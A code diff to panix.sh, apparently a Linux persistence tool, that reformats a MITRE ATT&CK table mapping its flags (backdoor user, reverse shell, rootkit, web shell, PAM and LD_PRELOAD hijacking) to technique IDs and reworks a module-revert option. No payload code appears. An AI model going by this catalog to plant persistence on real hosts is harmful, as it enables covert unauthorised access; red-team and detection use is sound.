-    printf "%-25s %-40s %-15s %-40s %-20s %-70s\n" "Persistence Method" "Technique Name" "Technique ID" "Sub-technique Name" "Sub-technique ID" "URL"
-    printf "%-25s %-40s %-15s %-40s %-20s %-70s\n" "-------------------" "--------------" "-------------" "-----------------" "---------------" "---------------------------------------------"
+	echo -e "\n\033[1;34mMITRE ATT&CK Matrix - Persistence Techniques Supported by PANIX\033[0m\n"
+	printf "%-25s %-40s %-15s %-40s %-20s %-70s\n" "Persistence Method" "Technique Name" "Technique ID" "Sub-technique Name" "Sub-technique ID" "URL"
+	printf "%-25s %-40s %-15s %-40s %-20s %-70s\n" "-------------------" "--------------" "-------------" "-----------------" "---------------" "---------------------------------------------"
 
-    printf "%-25s %-40s %-15s %-40s %-20s %-70s\n" \
-        "--at" "Scheduled Task" "T1053" "At" "T1053.002" "https://attack.mitre.org/techniques/T1053/002" \
-        "--authorized-keys" "Account Manipulation" "T1098" "SSH Authorized Keys" "T1098.004" "https://attack.mitre.org/techniques/T1098/004" \
-        "--backdoor-user" "Create Account" "T1136" "Local Account" "T1136.001" "https://attack.mitre.org/techniques/T1136/001" \
-        "--bind-shell" "Command and Scripting Interpreter" "T1059" "Unix Shell" "T1059.004" "https://attack.mitre.org/techniques/T1059/004" \
-        "--cap" "Abuse Elevation Control Mechanism" "T1548" "N/A" "N/A" "https://attack.mitre.org/techniques/T1548" \
-        "--create-user" "Create Account" "T1136" "Local Account" "T1136.001" "https://attack.mitre.org/techniques/T1136/001" \
-        "--cron" "Scheduled Task" "T1053" "Cron" "T1053.003" "https://attack.mitre.org/techniques/T1053/003" \
-        "--docker-container" "Escape to Host" "T1610" "N/A" "N/A" "https://attack.mitre.org/techniques/T1610" \
-        "--generator" "Create or Modify System Process" "T1543" "Systemd Service" "T1543.002" "https://attack.mitre.org/techniques/T1543/002" \
-        "--git" "Event Triggered Execution" "T1546" "N/A" "N/A" "https://attack.mitre.org/techniques/T1546" \
-        "--initd" "Boot or Logon Initialization Scripts" "T1037" "N/A" "N/A" "https://attack.mitre.org/techniques/T1037" \
-        "--ld-preload" "Hijack Execution Flow" "T1574" "Dynamic Linker Hijacking" "T1574.006" "https://attack.mitre.org/techniques/T1574/006" \
-        "--lkm" "Boot or Logon Autostart Execution" "T1547" "Kernel Modules and Extensions" "T1547.006" "https://attack.mitre.org/techniques/T1547/006" \
-        "--malicious-package" "Event Triggered Execution" "T1546" "Installer Packages" "T1546.016" "https://attack.mitre.org/techniques/T1546/016" \
-        "--motd" "Boot or Logon Initialization Scripts" "T1037" "N/A" "N/A" "https://attack.mitre.org/techniques/T1037" \
-        "--package-manager" "Event Triggered Execution" "T1546" "Installer Packages" "T1546.016" "https://attack.mitre.org/techniques/T1546/016" \
-        "--pam" "Modify Authentication Process" "T1556" "Pluggable Authentication Modules" "T1556.003" "https://attack.mitre.org/techniques/T1556/003" \
-        "--passwd-user" "Account Manipulation" "T1098" "N/A" "N/A" "https://attack.mitre.org/techniques/T1098" \
-        "--password-change" "Account Manipulation" "T1098" "N/A" "N/A" "https://attack.mitre.org/techniques/T1098" \
-        "--rc-local" "Boot or Logon Initialization Scripts" "T1037" "RC Scripts" "T1037.004" "https://attack.mitre.org/techniques/T1037/004" \
-        "--reverse-shell" "Command and Scripting Interpreter" "T1059" "Unix Shell" "T1059.004" "https://attack.mitre.org/techniques/T1059/004" \
-        "--rootkit" "Rootkit" "T1014" "N/A" "N/A" "https://attack.mitre.org/techniques/T1014" \
-        "--shell-profile" "Event Triggered Execution" "T1546" "Unix Shell Configuration Modification" "T1546.004" "https://attack.mitre.org/techniques/T1546/004" \
-        "--ssh-key" "Account Manipulation" "T1098" "SSH Authorized Keys" "T1098.004" "https://attack.mitre.org/techniques/T1098/004" \
-        "--sudoers" "Abuse Elevation Control Mechanism" "T1548" "Sudo and Sudo Caching" "T1548.003" "https://attack.mitre.org/techniques/T1548/003" \
-        "--suid" "Abuse Elevation Control Mechanism" "T1548" "Setuid and Setgid" "T1548.001" "https://attack.mitre.org/techniques/T1548/001" \
-        "--system-binary" "Compromise Host Software Binary" "T1554" "N/A" "N/A" "https://attack.mitre.org/techniques/T1554" \
-        "--systemd" "Create or Modify System Process" "T1543" "Systemd Service" "T1543.002" "https://attack.mitre.org/techniques/T1543/002" \
-        "--udev" "Event Triggered Execution" "T1546" "Udev Rules" "T1546.017" "https://attack.mitre.org/techniques/T1546/017" \
-        "--web-shell" "Server Software Component" "T1505" "Web Shell" "T1505.003" "https://attack.mitre.org/techniques/T1505/003" \
-        "--xdg" "Boot or Logon Autostart Execution" "T1547" "XDG Autostart Entries" "T1547.013" "https://attack.mitre.org/techniques/T1547/013"
-    
-    echo -e "\n\033[1;32mLegend:\033[0m"
-    echo "Technique: High-level MITRE ATT&CK technique."
-    echo "Sub-Technique: Specific sub-technique under a high-level technique."
-    echo "N/A: No specific sub-technique defined for this method."
-    echo "URL: Link to the official MITRE ATT&CK page for further details."
-    echo ""
+	printf "%-25s %-40s %-15s %-40s %-20s %-70s\n" \
+		"--at" "Scheduled Task" "T1053" "At" "T1053.002" "https://attack.mitre.org/techniques/T1053/002" \
+		"--authorized-keys" "Account Manipulation" "T1098" "SSH Authorized Keys" "T1098.004" "https://attack.mitre.org/techniques/T1098/004" \
+		"--backdoor-user" "Create Account" "T1136" "Local Account" "T1136.001" "https://attack.mitre.org/techniques/T1136/001" \
+		"--bind-shell" "Command and Scripting Interpreter" "T1059" "Unix Shell" "T1059.004" "https://attack.mitre.org/techniques/T1059/004" \
+		"--cap" "Abuse Elevation Control Mechanism" "T1548" "N/A" "N/A" "https://attack.mitre.org/techniques/T1548" \
+		"--create-user" "Create Account" "T1136" "Local Account" "T1136.001" "https://attack.mitre.org/techniques/T1136/001" \
+		"--cron" "Scheduled Task" "T1053" "Cron" "T1053.003" "https://attack.mitre.org/techniques/T1053/003" \
+		"--docker-container" "Escape to Host" "T1610" "N/A" "N/A" "https://attack.mitre.org/techniques/T1610" \
+		"--generator" "Create or Modify System Process" "T1543" "Systemd Service" "T1543.002" "https://attack.mitre.org/techniques/T1543/002" \
+		"--git" "Event Triggered Execution" "T1546" "N/A" "N/A" "https://attack.mitre.org/techniques/T1546" \
+		"--initd" "Boot or Logon Initialization Scripts" "T1037" "N/A" "N/A" "https://attack.mitre.org/techniques/T1037" \
+		"--ld-preload" "Hijack Execution Flow" "T1574" "Dynamic Linker Hijacking" "T1574.006" "https://attack.mitre.org/techniques/T1574/006" \
+		"--lkm" "Boot or Logon Autostart Execution" "T1547" "Kernel Modules and Extensions" "T1547.006" "https://attack.mitre.org/techniques/T1547/006" \
+		"--malicious-package" "Event Triggered Execution" "T1546" "Installer Packages" "T1546.016" "https://attack.mitre.org/techniques/T1546/016" \
+		"--motd" "Boot or Logon Initialization Scripts" "T1037" "N/A" "N/A" "https://attack.mitre.org/techniques/T1037" \
+		"--package-manager" "Event Triggered Execution" "T1546" "Installer Packages" "T1546.016" "https://attack.mitre.org/techniques/T1546/016" \
+		"--pam" "Modify Authentication Process" "T1556" "Pluggable Authentication Modules" "T1556.003" "https://attack.mitre.org/techniques/T1556/003" \
+		"--passwd-user" "Account Manipulation" "T1098" "N/A" "N/A" "https://attack.mitre.org/techniques/T1098" \
+		"--password-change" "Account Manipulation" "T1098" "N/A" "N/A" "https://attack.mitre.org/techniques/T1098" \
+		"--rc-local" "Boot or Logon Initialization Scripts" "T1037" "RC Scripts" "T1037.004" "https://attack.mitre.org/techniques/T1037/004" \
+		"--reverse-shell" "Command and Scripting Interpreter" "T1059" "Unix Shell" "T1059.004" "https://attack.mitre.org/techniques/T1059/004" \
+		"--rootkit" "Rootkit" "T1014" "N/A" "N/A" "https://attack.mitre.org/techniques/T1014" \
+		"--shell-profile" "Event Triggered Execution" "T1546" "Unix Shell Configuration Modification" "T1546.004" "https://attack.mitre.org/techniques/T1546/004" \
+		"--ssh-key" "Account Manipulation" "T1098" "SSH Authorized Keys" "T1098.004" "https://attack.mitre.org/techniques/T1098/004" \
+		"--sudoers" "Abuse Elevation Control Mechanism" "T1548" "Sudo and Sudo Caching" "T1548.003" "https://attack.mitre.org/techniques/T1548/003" \
+		"--suid" "Abuse Elevation Control Mechanism" "T1548" "Setuid and Setgid" "T1548.001" "https://attack.mitre.org/techniques/T1548/001" \
+		"--system-binary" "Compromise Host Software Binary" "T1554" "N/A" "N/A" "https://attack.mitre.org/techniques/T1554" \
+		"--systemd" "Create or Modify System Process" "T1543" "Systemd Service" "T1543.002" "https://attack.mitre.org/techniques/T1543/002" \
+		"--udev" "Event Triggered Execution" "T1546" "Udev Rules" "T1546.017" "https://attack.mitre.org/techniques/T1546/017" \
+		"--web-shell" "Server Software Component" "T1505" "Web Shell" "T1505.003" "https://attack.mitre.org/techniques/T1505/003" \
+		"--xdg" "Boot or Logon Autostart Execution" "T1547" "XDG Autostart Entries" "T1547.013" "https://attack.mitre.org/techniques/T1547/013"
+	
+	echo -e "\n\033[1;32mLegend:\033[0m"
+	echo "Technique: High-level MITRE ATT&CK technique."
+	echo "Sub-Technique: Specific sub-technique under a high-level technique."
+	echo "N/A: No specific sub-technique defined for this method."
+	echo "URL: Link to the official MITRE ATT&CK page for further details."
+	echo ""
 }
 
 # Main script logic
 # Only source modules dynamically if the script is executed directly
 if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
-    MODULES_DIR="$(dirname "${BASH_SOURCE[0]}")/modules"
-    for module in "$MODULES_DIR"/*.sh; do
-        if [[ -f $module ]]; then
-            source "$module"
-        fi
-    done
+	MODULES_DIR="$(dirname "${BASH_SOURCE[0]}")/modules"
+	for module in "$MODULES_DIR"/*.sh; do
+		if [[ -f $module ]]; then
+			source "$module"
+		fi
+	done
 fi
 
 main() {
@@ -5078,11 +7619,6 @@ main() {
 				;;
 			--mitre-matrix )
 				display_mitre_matrix
-				exit
-				;;
-			--revert )
-				shift
-				revert_changes
 				exit
 				;;
 			--at )
@@ -5238,6 +7774,47 @@ main() {
 			--xdg )
 				shift
 				setup_xdg "$@"
+				exit
+				;;
+			--revert )
+				shift
+				if [[ -z $1 ]]; then
+					echo "Error: Missing module name. Use '--revert all' to revert all modules or specify a module name."
+					echo ""
+					echo "Example 1: ./panix.sh --revert malicious-package"
+					echo "Example 2: ./panix.sh --revert all"
+					echo "Example 3: ./panix.sh --revert-all"
+					echo ""
+					echo "Modules: all, at, authorized-keys, backdoor-user, bind-shell, cap, create-user, cron, malicious-container, generator, git, initd, ld-preload, lkm, malicious-package, motd, package-manager, pam, passwd-user, password-change, rc-local, rootkit, shell-profile, ssh-key, sudoers, suid, system-binary, systemd, udev, xdg"
+					echo ""
+					exit 1
+				fi
+
+				# Check if "all" is specified
+				if [[ "$1" == "all" ]]; then
+					echo "[+] Running full reversion with --revert-all..."
+					revert_all
+					exit
+				fi
+
+				# Replace hyphens with underscores for function names
+				MODULE_NAME="revert_${1//-/_}"
+
+				if type "$MODULE_NAME" &>/dev/null; then
+					echo ""
+					echo "######################### [+] Reverting $1 module... #########################"
+					echo ""
+					$MODULE_NAME  # Execute the function
+				else
+					echo ""
+					echo "Error: Revert function for module '$1' not found."
+					echo ""
+					exit 1
+				fi
+				exit
+				;;
+			--revert-all )
+				revert_all
 				exit
 				;;
 			* )
